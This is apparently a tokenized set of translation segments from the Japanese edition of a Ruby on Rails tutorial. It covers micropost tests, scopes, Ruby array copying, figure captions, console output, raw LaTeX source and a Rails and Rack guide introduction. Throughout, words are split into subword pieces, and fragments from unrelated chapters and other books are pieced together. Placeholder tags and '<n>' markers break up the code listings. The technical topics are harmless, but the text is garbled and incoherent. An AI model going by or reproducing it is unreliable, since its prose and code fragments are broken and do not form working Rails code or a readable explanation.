▁ The ▁ pro b le m ▁is ▁that ▁we ▁ w an t ▁the ▁ microposts ▁to ▁ ex ist ▁ im media te ly , ▁ s o ▁that ▁the ▁ timestamp s ▁are ▁in ▁the ▁ right ▁ order ▁and ▁ s o ▁that ▁\ ko de {@ user . microposts } ▁is n ’ t ▁ empty . ▁We ▁a c com p li sh ▁this ▁with ▁\ ko de { let ! } , ▁ w h i ch ▁ force s ▁the ▁c or respond ing ▁ variable ▁to ▁ com e ▁in to ▁ ex ist en ce ▁ im media te ly .
▁ ユーザ の マイクロポストの 順序 をテストする 。
▁ 上 記 のコード で 重要な のは 、 以下の行 です 。
▁これは 新しい ポ スト が 最初に 来 ること を テスト しています 。
▁ デフォルトで は ▁id 順に 並 ぶ ため \ ko de { [ ol de r _ micropost , ▁ new er _ micropost ]} の 順序 になり テストは 失敗 するはずです 。
▁self を省略した 結果を リスト \ ref { code : micropost _ order ing } に示します 。
▁\ ko de { default _ scope } で で マイクロポストを 順序 付け る
▁上のコード で の 順序 は \ ko de { ’ created _ at ▁D E S C ’ } と しています 。 \ ko de { D E S C } は ▁ SQL で い う ところ の ▁“ de sc end ing ” ▁ であり 、 新しい もの から 古 い 順 への 降 順 という ことになります 。
▁Rails ▁4.0 から は 、 あらゆる スコープ は 、 スコープ で 必要な 域 値 を返す 無 名 関数 を受け取り ます 。 これにより 、 スコープ を その 場 で 評価 する必要が ほぼ なく なり 、 後に 読み込まれ たとき に 必要に応じて 評価 する ようになります ▁( い わ ゆ る \ emph { } 遅 延 評価 ▁( la z y ▁ eval u ation ) ▁ です )。
▁ この種の オブジェクトの 構 文 は 、\ emph { Proc } ▁( 手 続 き : ▁ pro c ed ur e ) ▁ と か \ emph { ラ ム ダ ▁( la m b d a ) } と 呼ばれ 、\ ko de { - > } という 矢 印 で 表 されます 。
▁( Proc や ラ ム ダ は Ruby の トピック として は や や 高度な 部 類 に含まれる ので 、 今 すぐ わ から なくても 心 配 する必要はありません 。 )
▁\ ref { sec : destroy ing _ users } で 書いた ように 、 サイト 管理者 は ユーザーを \ emph { 破 棄 する } 権限 を 持 ち ます 。
▁ 最初の マイクロポストの ユーザーを 破 棄 した 後 、 関連する マイクロポスト も データベースから なく な った ことを確認する ことで 、 ユーザーの 破 棄 をテストする ことができます 。
▁ 適切に マイクロポストの 破 棄 をテストする ために 、 最初に ローカル変数 で 指定された ユーザーの ポ スト を取得し 、 次に ユーザーを 破 棄 します 。
▁ シンプルな 実装 は以下のようになります 。
▁# ▁ マイクロポスト が データベースから なく な った ことを確認
▁ 残 念 ですが 、 上のコード は Ruby の配列 の 妙 により 動 き ません 。
▁Ruby における 配列 の 代入 は 「\ emph { 参 照 } の コピー 」 であり 、 配列 全体 そのもの の コピー では ない ため 、 オ リ ジ ナ ル の配列 に対して 何らかの 変更 を行う と 、 その コピー にも 同じ 変更 が行われ てしまいます 。
▁たとえば 以下のように 、 配列 を作成し 、 2 番目の 変数 を その 配列 に 代入 して から 、\ ko de { reverse ! } メソッドを使用して 最初の 配列 を 逆 順に すると します 。
▁ 驚 く かもしれませんが 、 上のコード では 、\ ko de { a } が 逆 転 した だけ ではなく 、\ ko de { b } まで 逆 転 されて し ま っています 。
▁これは 、\ ko de { a } と \ ko de { b } が 同じ 配列 を 指 している ためです
▁( 同じ ことは 、 文字列 と ハッシュ など 、 他の Ruby の データ 構造 でも 発生 します )。
▁ ユーザ の マイクロポストの 場合には 、 こう なります 。
▁( この時点で は 、 関連付けられた マイクロポストの 破 棄 を 実装 していない ので 、 上のコード は 動作 しません 。 原 理 を 説明 する ため だけ に 書い ています 。 )
▁ここでは 、 ユーザ オブジェクトを 破 棄 しても 、\ ko de { microposts } 変数 は 空 の配列 \ ko de { [ ]} として 残 されている ことがわかります 。
▁この 「 参 照 が コピー される 」 動作 は 、 Ruby の オブジェクトの 複 製 を行う ときに 多 大 な 注意 を 払 わ ない と い け ないこと を 意味 します 。
▁ 配列 などの 比 較 的 単純な オブジェクトを 複 製 するには 、\ ko de { dup } メソッド を使用する ことができます 。
▁( このような 比 較 的 単純な オブジェクトの 複 製 作業 は ▁“ sh allow ▁ co p y ” ▁ として 知 られ ています 。
▁ より 複雑な オブジェクトを 複 製 する ▁" deep ▁ co p y " ▁ を実装する ことは は る か に 難 しい 問題 であり 、 実際に 一般的な 解決 策 はありません が 、 検索 エンジン で ▁" ruby ▁ deep ▁ co p y " ▁ を検索する と 、 ネスト した 配列 のような 、 より 複雑な 構造 を コピー する 必要がある 場合 の 解決 策 が 見つか る と思います 。 )
▁ユーザーの マイクロポスト に \ ko de { dup } メソッドを 適 用 すると 、 次のような コード になります 。
▁上のコード で 、\ ko de { to _ a } メソッドが 呼び出され ている ことで マイクロポストの コピー が作成され ていることに注目してください ▁( 参 照 の コピー ではなく 、 オブジェクト 自体 が コピー されています )。 さらに 、 以下の行 にも 注目してください 。
▁上の 行 は 一 種 の セ フ テ ィ チェック の 役 割 も 果 た し ており 、 う っかり \ ko de { to _ a } メソッドを 付け 忘れ たとき の エラー をすべて キャッチ してくれます 。
▁ここで 重要な のは 、\ ko de { to _ a } メソッドが なかった ら 、 ユーザーを削除 したときに \ ko de { microposts } 変数 に 含 まれ ている ポ スト まで 削除 され てしまう ということです 。
▁つまり 、\ ko de { microposts } が 空 になっ てしまう ため 、 上の テスト に 何 を 書い ても 動作 し なく な っ てしまう ということです 。
▁ データベースに マイクロポスト がない という 予 想 は 、 以下のように 書く ことができます 。
▁上のコードでは 、\ ko de { Micropost . find } ではなく \ ko de { Micropost . where } を使用しています 。 where メソッドは 、 レコード がない 場合に 空 の オブジェクト を返す ので 多 少 テストが 書き や す くなる ためです ▁( find は レコード がない 場合に 例外を発生 します )。 (
▁ 気 になる 方 への 補 足 : ▁ find を使用する場合 は以下のようになります 。
▁これで find の場合 のテスト を 実 施 できます 。 )
▁ ユーザーを 破 棄 すると マイクロポスト も 破 棄 される こと をテストする 。
▁self を省略した 結果を リスト \ ref { code : micropost _ dependency } に示します 。
▁これで 、 ユーザー / マイクロポスト 関連付け の 最 終 形 が 完成 しました 。 すべての テストが パス するはずです 。
▁\ ko de { user _ id } 属性 と同様 、\ ko de { content } 属性 も 存 在 する必要が あり 、 さらに \ emph { マ イ ク ロ } ポ スト が 14 0 文字 より 長 く な らない よう 制限 を加え ます 。
▁ 実際の アプリケーション コードは わずか 1 行 です 。
▁ これはリスト \ ref { code : micropost _ validations } で使用されていま した 。
▁ユーザーの マイクロポスト 表示 に対するテスト 、 す な わ ち ユーザー に対する request ▁ spec を作成する ところ から 始 め ましょう 。
▁ ユーザーに 関連付けられている マイクロポストの ファクトリー を作成し 、 それ から 表示 ページ が 各 ポ スト の内容 を 含 んで いる か 検証 する 戦 略 で 進め ます 。
▁ そこで 、 今回 も \ ko de { let ! } を使います 。
▁ これはリスト \ ref { code : user _ show _ microposts _ test } で使用されていま した 。
▁ユーザーの \ ko de { show } ページ で マイクロポスト が表示されている こと をテストする 。
▁\ ko de { count } メソッドは 、 関連付けを \ emph { 経 由 して } 使用している ことに注目してください 。
▁\ ko de { count } 関連付け メソッドは 賢 く でき て いて 、 直接 データベース で カウント を行います 。
▁ 特に 、 データベース 上の マイクロポストを 全 部 読み だ して から 結果 の配列 に対して \ emph { length } を 呼 ぶ ような 無 駄 な ことは \ ko de { していません } 。 そ ん な ことを した ら 、 マイクロポストの 数 が 増 加 する に つ れ て 効率 が 低 下 し てしまいます 。
▁self を省略した 結果を リスト \ ref { code : user _ show _ microposts } に示します 。
▁< as id e >
▁ すぐ にも マイクロポスト 一覧 の実装 に 取り か か ります が 、 その 前に 注意 すべき 点が いくつか あります 。
▁ 今回の 場合は 、 ユーザー コントローラの コンテキスト において 、\ emph { マイクロポスト } を ページネーション したい ため 、 明示的に \ ko de {@ microposts } 変数 を \ ko de { ▁ will _ paginate } に 渡す 必要があります 。
▁最後に 、 以下のように マイクロポストの 現在の 数 の カウント を追加します 。
▁ 前 述 のように 、\ ko de {@ user . microposts . count } は 、 ユーザー / マイクロポスト 関連付け を経由して 、 ある ユーザーに 属 する マイクロポストを カウント すること を 除 け ば 、\ ko de { User . count } に 似 ています 。
▁ や っ と マイクロポスト 一覧 のコード そのもの に た ど り 着 き ました 。
▁この \ emph { 順序 リスト } タグ \ ko de { ol } を含む コードが マイクロポストの 一覧 を生成します 。 ただし ご 覧 の とおり 、 実装 の 厄 介 な 部分を マイクロポスト パーシャル に 任 せ ています 。
▁ 同様に 以下のコード は 、
▁ まったく 同じ ことを マイクロポスト で 行います 。
▁self を省略した 結果を リスト \ ref { code : micropost _ partial } に示します 。
▁ その後 、 各 ユーザーに 50 の マイクロポスト ▁( ページネーション が 切り 替 わ る 30 を 超 え る 数 ) ▁ を作成し 、 F a k er ▁gem の 便利な \ href { http :// ruby doc . info / gem s / fa k er /1 . 3.0 / F a k er / L or e m } { L or e m . s ent en ce } \ text tt { } メソッドを使って 各 マイクロポストの サンプル コンテンツ を生成します
▁もちろん 、 新しい サンプルデータ を生成する ためには Rake タスク の \ ko de { db : p o p ul at e } を実行する 必要があります 。
▁ 最後の 図 \ ref { fig : user _ profile _ microposts _ page _ 2 _ rails _ 3 } では 、 最初の ユーザーの \ emph { 2 番 目 } の ページ と 、 下 部 にある ページネーション の リンクを 表示 しています 。
▁ 従来 の Rails 開発 の 慣習 と 異なる 箇所 が 1 つ あります 。 Microposts リソース への インターフェイス は 、 主 に ユーザー と 静的ページ の コントローラ を経由して 実行される ので 、 Microposts コントローラ には \ ko de { new } や \ ko de { edit } のような アクション は 不 要 という ことになります 。 \ ko de { create } と \ ko de { destroy } があれば 十分 です 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ href { http :// www . michael hartl . com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl ) } ▁ は 、 「\ href { http :// www . railstutorial . org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という 、\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails } ▁ を使って 初めて ▁Web ▁ アプリケーションを 開発 する 際に 最も よく 参 考 に される 本 の 著者 です 。
▁ここで の アクセス 制 御 の ポ イン ト は 単 純 です 。 \ ko de { create } アクション と \ ko de { de s to ry } アクション は 、 いずれ も ユーザ が サインイン して い なければ 実行 できない もの とします 。
▁ これはリスト \ ref { code : micropost _ access _ control } で使用されていま した 。
▁ マイクロポスト 用の アクセス 制 御 テスト 。
▁ サインイン していない ユーザー は 、\ text tt { POST } リクエストを / microposts ▁(\ ko de { post ▁ microposts _ path }、\ ko de { create } アクション が 呼び出される ) ▁ に 送信 した 場合 、 または ▁\ text tt { DELETE } リクエストを / microposts /1 ▁(\ ko de { delete ▁ micropost _ path ( micropost ) }、\ ko de { destroy } アクション が 呼び出される ) ▁ に 送信 した 場合に リダイレクト されます 。
▁リスト \ ref { code : micropost _ access _ control } の テストにパス するために は 、 少し アプリケーション 側 の コードを リファクタリング しておく必要があります 。
▁( 注意 : ▁ Microposts コントローラ ファイルを コマンドライン で 生成 して い なかった ので 、 この コントローラ を 手動で 作成する必要があります )。
▁ Microposts コントローラのアクション に 認 証 を追加する 。
▁ これはリスト \ ref { code : microposts _ create _ tests } で使用されていま した 。
▁ マイクロポスト 作成 のテスト 。
▁このコードは リスト \ ref { code : user _ info } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : micropost _ form } で使用されていま した 。
▁ これはリスト \ ref { code : gravatar _ option } で使用されていま した 。
▁しかし 今回の ように ▁“ 1 ▁ microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤 り になっ てしまう ので 、\ ko de { pluralize } メソッドを使用して ▁“ 1 ▁ micropost ” ▁ や ▁“ 2 ▁ microposts ” ▁ と 表示する ように 調 整 します 。
▁ ど のような 種類 の オブジェクトが 渡 されて も エラーメッセージ パーシャル が 動く ように する必要があります 。
▁ 幸 い 、 フォーム 変数 \ ko de { f } を \ ko de { f . object } と すること によって 、 関連付けられたオブジェクト にアクセス することができます 。 従って 、 以下のコード の場合
▁ 運 悪 く 、 サインアップ と 編集 フォーム が 古 い バージョンの メッセージ パーシャル を 利用 している ため 、 User の request ▁ spec が 壊 れ てしまい ました 。
▁このコードは リスト \ ref { code : signup _ errors _ updated } で使用されていま した 。 もうひとつ 、
▁ この時点で 、 すべての テストが パス するはずです 。
▁ すべての ユーザーが フィード を持つ ので 、\ ko de { feed } メソッドは User モデルに 作る の が 自 然 です 。
▁ 最終的に は その feed メソッドが 、 フォローしているユーザー の マイクロポスト も 返す こと をテストします が 、 今 は 、\ ko de { feed } メソッドが 自分の マイクロポスト は \ emph { 含 む が } 他 ユーザーの マイクロポスト は \ emph { 含 ま ない } こと をテストする ことにします 。
▁( プロ ト ) ▁ ステータスフィード のテスト 。
▁この テストでは 、 与えられた 要素 が 配列 に 含 まれ ている かどうか をチェックする \ ko de { include ?} メソッド を使用しています
▁\ ko de { include ?} のような メソッド を学ぶ ことが 、
▁self を省略した 結果を リスト \ ref { code : proto _ status _ feed } に示します 。
▁ ホ ー ム ページの フィード 表示 をテストする 。
▁ それ により 、 上のコード が 各 ア イ テ ム に対して マッチする ように する の が 目的 です
▁ これはリスト \ ref { code : home _ page _ feed _ test } で使用されていま した 。
▁ この時点で 、 ( プロ ト ) フィード と その テスト はすべて 動く はずです 。
▁ Microposts コントローラの \ ko de { destroy } アクション をテストする 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁(\ ko de { to _ s } メソッドを 呼び出し ている のは 、\ ko de { nil } トークン を 扱 え るように する ためです 。 ブラウザで nil トークン が発生する ことは あって は なり ません が 、 テスト 中に 発生 すること は あり え る ためです )。
▁これ を行う には \ href { http :// en . w ikipedia . org / wiki / C all b ack _ ( com put er _ sc i en ce ) }{\ emph { コールバック } } という テクニック を 利用 します 。 コールバック とは 、 Active ▁Record オブジェクトが 持 続 している 間 の ど こ か の 時点 で 、 Active ▁Record オブジェクト に 呼び出し ても ら う メソッド です ▁( Rails ▁API の 「\ href { http :// api . rubyonrails . org / v 4.1 . 4 / classes / ActiveRecord / Callbacks . html } { コールバック の 登録 ポ イン ト } ▁( 英語 )」 を参照してください )。
▁{0} 図 5 . 8 {/0} ▁{1} \ href { http ://0.0.0.0:3000/ about }{/ about } で 表示される About ページ {/1}
▁なお 、 以前の バージョンの Rails では \ text tt { PATCH } ではなく \ text tt { PUT } が 使用 され ていました 。 PUT は Rails ▁4.0 でも 依 然 サポート されて は います が 、\ text tt { PATCH } の 方が \ href { http :// web log . rubyonrails . org / 20 12 / 2 / 2 6 / ed g e - rails - patch - is - the - new - primary - http - method - for - update s /}{ 意 図 した HTTP の 使用 法 により 適 している } ので 、 新しい アプリケーション では PATCH が 推 奨 されています 。
▁ も し この ステップ が 摩訶 不 思 議 に 思 え たら 、 次のように 考えてみましょう 。 「 私 は ただ \ href { https :// github . com / t w b s / bootstrap - sass } { bootstrap - sass の README ファイル } に従って いる の だ 」 と 。
▁ その後 、 各 ユーザーに 50 の マイクロポスト ▁( ページネーション が 切り 替 わ る 30 を 超 え る 数 ) ▁ を作成し 、 F a k er ▁gem の 便利な \ href { http :// fa k er . ruby f org e . org / rdoc / classes / F a k er / L or e m . html } { L or e m . s ent en ce } \ text tt { } メソッドを使って 各 マイクロポストの サンプル コンテンツ を生成します
▁\ href { http ://0.0.0.0:3000/ microposts / new }{/ microposts / new } ページを ブラウザで 開 き 、 新しいマイクロポスト の 情報を 入力 して マイクロポストを いくつか 作成 してみましょう ▁( {1}{2} 図 2.1 2 {/2}{/1} )。
▁\ text tt { rails ▁ server } を実行し たとき の デフォルトの Rails ページ 。
▁User モデル に対して \ ko de { has _ secure _ password } を追加する 利 点 は \ ref { sec : creat ing _ a _ user } で 少し だけ 説明します が 、 ▁その 前に 、 パスワード の 最 小文字 数 を 設定 する方法について 説明します 。
▁ これはリスト \ ref { code : failing _ validates _ name _ test } で使用されていま した 。
▁\ ref { sec : re p o s it or y _ host } の 手順 に 沿 って 進め た場合 、\ ko de { README . rdoc } ファイル が自動的に 認 識 され ず 、 README がない という メッセージ が表示される ことに 気 付 いた でしょう ▁( 図 \ ref { fig : bitbucket _ no _ read me })。
▁( Co de ▁S ch o ol の \ href { http :// www . code s ch o ol . com / c our s es / testing - with - rspec } { RSpec コース } の 履 修 を 検 討 してみる の も よいでしょう 。 この コース は RSpec に関する 多くの 疑 問 に 答 え てくれる という 読者 から の 報 告 もあります )。
▁ Gemfile に 新しく 追加 した gem を 実際に インストール するには 、\ ko de { bundle ▁ update } と \ ko de { bundle ▁install } を実行します 。
▁ 注 : ▁この オプションは ▁“ remember ed ▁ option ” ▁ と呼ばれる もの で 、 この オプションを 一度 実行 すると コマンド に保存 され 、 今後 Bundler を実行する ときに オプションを 追加 する必要が なくなります 。
▁{0} 図 10 . 4 {/0} {1} マイクロポスト が表示され た プロファイル ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / user _ microposts _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 5 {/0} {1} マイクロポスト 用の コード のある ユーザー プロファイル ページ ▁( ただし マイクロポスト がない )。 \ href { http :// railstutorial . org / images / figure s / user _ profile _ no _ microposts _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 6 {/0} {1} ユーザー プロファイル ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 }) ▁ と スタイル の ない マイクロポスト 。 \ href { http :// railstutorial . org / images / figure s / user _ profile _ microposts _ no _ st y l ing _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 7 {/0} {1} ユーザー プロファイル ▁(\ href { http :// localhost :3000/ users /1 }{/ users /1 }) ▁ と マイクロポスト 。 \ href { http :// railstutorial . org / images / figure s / user _ profile _ with _ microposts _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 8 {/0} {1} 別 ユーザ の プロファイル と マイクロポスト ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 })。 \ href { http :// railstutorial . org / images / figure s / other _ profile _ with _ microposts _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 10 {/0} {1} マイクロポスト 作成 フォーム のある ホ ー ム ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / home _ page _ with _ micropost _ form _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 11 {/0} {1} 新しいマイクロポスト フォーム のある Home ページ ▁(\ href { http :// localhost :3000/ }{/ })。 \ href { http :// railstutorial . org / images / figure s / home _ with _ form _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 12 {/0} {1} エラーが表示され た Home ページ 。 \ href { http :// railstutorial . org / images / figure s / home _ form _ errors _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 1 3 {/0} {1} ▁( プロ ト ) フィード のある ホ ー ム ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / proto _ feed _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 14 {/0} {1} ▁( プロ ト ) ▁ フィード のある ホ ー ム ページ ( \ href { http :// localhost :3000/ }{/ })。 \ href { http :// railstutorial . org / images / figure s / home _ with _ proto _ feed - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 15 {/0} {1} 新しいマイクロポスト を作成 後 の Home ページ 。 \ href { http :// railstutorial . org / images / figure s / micropost _ created _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 16 {/0} {1} マイクロポストの 削除リンク と ▁( プロ ト ) ▁ フィード のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / micropost _ delete _ links _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 17 {/0} {1} 2 番 目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ 。 \ href { http :// railstutorial . org / images / figure s / home _ post _ delete _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 10 . 18 {/0} {1} 非常に 長 い 単 語 によって 崩 れ た レイアウト 。 \ href { http :// railstutorial . org / images / figure s / lo n g _ word _ micropost _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 最初の 一 番 重要な ステップ は 、 サイトの ユーザー 用の \ emph { データモデル } の作成 と 、 データを 保存 する手段 の 確 保 です 。
▁ 有効な メールアドレス かどうか ( ドット が 2 つ 以上 連 続 する かどうか ) を検証する 正規表現
▁{0} 図 3.1 {/0} {1} サンプルアプリケーションの \ ko de { config } ディレクトリ の内容 。 \ href { http :// railstutorial . org / images / figure s / config _ directory _ rails _ 4 - full . png }{( 拡大 ) }{/1}
▁{0} 図 3 .2{/0} {1} \ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス した 結果 。 \ href { http :// railstutorial . org / images / figure s / raw _ home _ view _ 3 1 - full . png }{( 拡大 ) }{/1}
▁{0} 図 3 . 3 {/0} {1} 赤 く 表示 されている ▁( 失敗した ) ▁ テスト 。 \ href { http :// railstutorial . org / images / figure s / re d _ failing _ spec _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 3 . 4 {/0} {1} 緑色 で 表示 されている ▁( 成功 した ) ▁ テスト 。 \ href { http :// railstutorial . org / images / figure s / g re en _ passing _ spec _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 3 . 5 {/0} {1} 作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static _ pages / about })。 \ href { http :// railstutorial . org / images / figure s / about _ us _ 2 n d _ edit ion - full . png }{( 拡大 ) }{/1}
▁つまり 、 W E B ri c k は \ href { https :// de v center . heroku . com / articles / ruby - default - web - server } { 本番環境 として 適切な Web サーバ ではありません } 。 よ って 、 今回は \ href { https :// de v center . heroku . com / articles / rails - P um a } { W E B ri c k を P um a という Web サーバ に置き換え て み ます } 。 P um a は 多数の リクエストを 捌 く ことに 適 した Web サーバ です 。
▁ 新しい Web サーバ を追加する ために 、\ href { https :// de v center . heroku . com / articles / rails - P um a } { Heroku 内の P um a ドキュメント } ▁( 英語 ) ▁ に したがって セットアップ していきます 。
▁\ href { http :// on line . p r a g ma tic st u d io . com /}{ P r a g ma tic ▁S t u d io } : ▁ M i ke ▁C l ar k と N i co le ▁C l ar k が 教 鞭 を 執 っている オンライン の Rails クラス です 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 . r c 2 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁ 一方 、 User モデルの 方 では 、\ ko de { has _ many ▁: microposts } と 追加する必要があります 。 ここ は自動的に 生成 され ないので 、 手動で 追加 してください ▁( リスト \ ref { code : user _ has _ many _ microposts })。
▁ これはリスト \ ref { code : log _ out _ method } で使用されていま した 。
▁ L o ad ing ▁ development ▁ environment
▁ >> ▁Rails . env
▁=> ▁" development "
▁ >> ▁Rails . env . development ?
▁=> ▁true
▁ >> ▁Rails . env . test ?
▁=> ▁false
▁$ ▁ rails ▁console ▁test
▁ L o ad ing ▁test ▁ environment
▁=> ▁" test "
▁$ ▁ rails ▁ server ▁-- environment ▁ production
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate ▁ R A I L S _ ENV = production
▁$ ▁ heroku ▁run ▁console
▁Ruby ▁console ▁for ▁your app . heroku app . com
▁=> ▁" production "
▁ >> ▁Rails . env . production ?
▁ 次の 章では 、 この { 0} 第 {1} 1 {/1} 章 {/0} で 学 んだ ことを 基 礎 として 、 データベース を 備 え た \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学 び ます 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 . r c 1 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁ n { U s ing ▁ key word ▁ ar g um ent s ▁in ▁the ▁\ ko de { gravatar \_ for } ▁ helper . ▁\ \ ▁\ file path { app / helpers / users \_ helper . rb } }< n > %= ▁ lang : ruby , ▁ options : ▁" h l _ line s " : ▁[ 4 ] < n >\ begin { code }< n > module ▁ Users Helper < n >< n > ▁# ▁ Re t ur n s ▁the ▁ Gravatar ▁for ▁the ▁ g ive n ▁ user . < n > ▁def ▁ gravatar _ for ( user , ▁ size : ▁ 8 0 )< n > ▁ gravatar _ id ▁= ▁D ig e st :: M D 5 :: h ex digest ( user . email . downcase )< n > ▁ gravatar _ url ▁= ▁" https :// secure . gravatar . com / a v at ar / # { gravatar _ id } ? s = # { size } " < n > ▁ image _ tag ( gravatar _ url , ▁ alt : ▁ user . name , ▁class : ▁" gravatar " )< n > ▁end < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁a _ gravatar _ image ▁( end )< n >< n > ▁\ section { ユーザー登録フォーム } ▁% ▁( fold )< n > ▁\ label { sec : signup _ form }< n >< n >
▁is e ' ▁id =' ex - ad 9 f d 0 ' ></ span >< n >< n >\ end { enumera te }< n >< n >< n > ▁% ▁subsection ▁ signup _ error _ messages ▁( end )< n >< n >< n > ▁\ subsection { 失敗 時の テスト } ▁% ▁( fold )< n > ▁\ label { sec : a _ test _ for _ invalid _ submission }< n >< n >
▁% >< n >< n > ▁<%= ▁f . label ▁: password ▁% >< n > ▁<%= ▁f . password _ field ▁: password , ▁class : ▁' form - control ' ▁% >< n >< n > ▁<%= ▁f . label ▁: password _ confirmation , ▁" Co n fi rm ation " ▁% >< n > ▁<%= ▁f . password _ field ▁: password _ confirmation , ▁class : ▁' form - control ' ▁% >< n >< n > ▁<%= ▁f . submit ▁" Create ▁ my ▁ account ", ▁class : ▁" b t n ▁ b t n - primary " ▁% >< n > ▁<% ▁end ▁% >< n > ▁</ div >< n ></ div >< n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁a _ test _ for _ invalid _ submission ▁( end )< n >< n > ▁% ▁ section ▁ unsuccessful _ signup s ▁( end )< n >< n > ▁\ section { ユーザー登録 成功 } ▁% ▁( fold )< n > ▁\ label { sec : success f ul _ signup s }< n >< n >
▁end { enumera te }< n >< n > ▁% ▁subsection ▁the _ flash ▁( end )< n >< n > ▁\ subsection { 実際の ユーザー登録 } ▁% ▁( fold )< n > ▁\ label { sec : the _ first _ signup }< n >< n >
▁ n d ▁% >< n > ▁ . < n > ▁ . < n > ▁ . < n ></ html >< n >\ end { code }< n >\ end { code list ing }< n >< n > % ▁subsection ▁a _ test _ for _ valid _ submission ▁( end )< n >< n > ▁\ section { プロ の デプロイ } ▁% ▁( fold )< n > ▁\ label { sec : pro f ess ion al _ gra de _ de p lo y m ent }< n >< n >
▁ gra de _ de p lo y m ent ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : sign _ up _ co nclusion }< n >< n > B e ing ▁ able ▁to ▁ sign ▁ up ▁ users ▁is ▁a ▁ ma j or ▁ m il e st one ▁for ▁ our ▁ application .
▁\ no in d ent ▁\ emph { L e ar n ▁ E no ug h ▁ Co m m and ▁ L in e ▁to ▁B e ▁D an g er o us } ▁is ▁ an ▁in tr o d u c tion ▁to ▁the ▁ command ▁ line ▁for ▁ com p let e ▁ begin n er s , ▁the ▁ first ▁in ▁a ▁\ href { http :// learn e no ug h . com /}{ s er ies ▁of ▁ tutorial s } ▁ de signed ▁to ▁t each ▁the ▁ com m on ▁f ound ation s ▁of ▁` ` com put er ▁ ma g i c ' ' ▁( B o x ~ \ ref { as id e : com put er _ ma g i c }) ▁to ▁as ▁ br o ad ▁ an ▁a u d i en ce ▁as ▁ p o s s i b le .
▁ 本書 は ソフトウェア 開発者 や 、 ソフトウェア 開発者 になり たい 方 々 のために 執 筆 されています 。 < n >
▁ U n li ke ▁ m o st ▁in tr o d u ct ions ▁to ▁the ▁ command ▁ line , ▁ w h i ch ▁t y p ical ly ▁as sum e ▁a ▁ re l at ive ly ▁ h ig h ▁ le ve l ▁of ▁ te ch n ical ▁ s o ph is tic ation , ▁\ emph { L e ar n ▁ E no ug h ▁ Co m m and ▁ L in e ▁to ▁B e ▁D an g er o us } ▁as sum es ▁ no ▁ pre r equ i site s ▁ other ▁ th an ▁ g en er al ▁ com put er ▁ k now l ed g e ▁( h o w ▁to ▁ la un ch ▁ an ▁ application , ▁ h o w ▁to ▁use ▁a ▁ web ▁ browser , ▁ h o w ▁to ▁\ href { http :// l m g t f y . com / ? q = learn + to + to u ch + type } { to u ch ▁type } , ▁ e t c . ).
▁Rails ▁ と ▁ Rack
▁= = = = =========
▁この ガイド では 、 Rails と Rack の関係 、 Rails と 他の Rack コンポーネント と の関係 について説明し ます 。
▁* ▁ Rack の ミドルウェア を Rails で 使う 方法
▁* ▁Action ▁P ack 内の ミドルウェアスタック について
▁* ▁ 独自の ミドルウェアスタック を定義する 方法
▁WARN ING : ▁この ガイド は Rack の ミドルウェア 、 url マ ッ プ 、` Rack :: B u il de r ` といった Rack の プロトコル や 概念 に関する 実 用 的な 知 識 がある ことを 前 提 に しています 。
▁ Rack 入 門
▁ Rack は 、 Ruby の ウ ェ ブ アプリケーション に対して 、 最 小 限 で モジュール 化 されて いて 、 応 用の 効 く インターフェイス を提供します 。
▁ Rack は HTTP リクエスト と レスポンス を 可能な か ぎ り 簡単な 方法で ラ ッ ピ ング することで 、 ウ ェ ブ サーバー 、 ウ ェ ブ フレームワーク 、 そ の間に 位 置 する ソフトウェア ▁( ミドルウェア と 呼ばれ ています ) ▁ の API を 一 つの メソッド 呼び出し の 形 に まとめ ます 。
▁* ▁[ Rack ▁API ▁ ド キ ュ メ ン テ ー ション ]( http :// rack . github . io / )
